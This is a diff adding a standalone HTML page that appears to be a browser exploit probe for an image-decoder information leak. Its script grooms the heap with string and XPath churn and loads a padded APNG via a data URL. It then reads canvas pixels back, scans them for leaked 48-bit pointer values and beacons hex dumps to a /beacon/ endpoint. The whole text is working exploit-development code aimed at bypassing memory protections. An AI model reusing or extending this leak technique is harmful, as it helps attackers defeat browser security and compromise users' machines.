@@ -1,0 +1,53 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng18</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex(d,n){var s='';for(var i=0;i<n*4;i++)s+=('0'+d[i].toString(16)).slice(-2);return s;}
+function scan(tag,d,n){                       // count qwords shaped like a 48-bit pointer
+  var hits=0,first='';
+  for(var i=0;i+8<=n*4;i+=4){
+    var lo=d[i]|(d[i+1]<<8)|(d[i+2]<<16), hi=d[i+3]|(d[i+4]<<8)|(d[i+5]<<16)|(d[i+6]<<24);
+    if(d[i+4]===0x7f && d[i+5]===0x00){ hits++; if(!first) first=hex(d.slice(i/4, i/4+2),2); }
+  }
+  b(tag+'-PTR-'+hits+(first?'-'+first:''));
+}
+function dumpCtx(tag,w,im,opts){
+  var c=document.createElement('canvas');c.width=w;c.height=1;
+  var g=c.getContext('2d',opts||{});
+  if(!g){ b(tag+'-NOCTX'); return; }
+  g.drawImage(im,0,0);
+  var d=g.getImageData(0,0,w,1).data;
+  b(tag+'-'+hex(d,w)); scan(tag,d,w);
+}
+function churnStr(n){ for(var k=0;k<n;k++){ var s=''; for(var j=0;j<58;j++) s+=String.fromCharCode(65+((j+k)%26)); s+=(''+(k*2654435761>>>0)); } return 'ok'; }
+function churnXP(n){ for(var k=0;k<n;k++) document.evaluate('count(//div)',document,null,XPathResult.NUMBER_TYPE,null).numberValue; return 'ok'; }
+var b64=null;
+function arm(tag,fn,next){
+  var t=fn?fn():'';
+  var im=new Image();
+  im.onload=function(){
+    b(tag+'-GROOM-'+t);
+    dumpCtx(tag+'-A64',64,im,{});
+    dumpCtx(tag+'-O64',64,im,{alpha:false});
+    dumpCtx(tag+'-O256',256,im,{alpha:false});
+    b(tag+'-END'); next();
+  };
+  im.onerror=function(){ b(tag+'-ERR'); next(); };
+  var suf=''; for(var q=0;q<4+tag.length;q++) suf+='QUFB';
+  im.src='data:image/png;base64,'+b64+suf;
+}
+function boot(){
+  b('P18-BOOT');
+  var dv=document.createElement('div');
+  for(var i=0;i<32;i++){var p=document.createElement('div');p.textContent='x';dv.appendChild(p);}
+  document.body.appendChild(dv);
+  fetch('/corpus/apng-fw1.png?r='+Date.now()).then(function(r){return r.arrayBuffer();}).then(function(ab){
+    var u=new Uint8Array(ab), s=''; for(var i=0;i<u.length;i++) s+=String.fromCharCode(u[i]);
+    b64=btoa(s); b('P18-B64-'+b64.length);
+    arm('P18-A',null,function(){
+      arm('P18-B',function(){return churnStr(4000);},function(){
+        arm('P18-C',function(){return churnXP(300);},function(){ b('P18-DONE'); });
+      });
+    });
+  });
+}
+window.addEventListener('load',boot);
+</script></head><body><p>apng18</p></body></html>
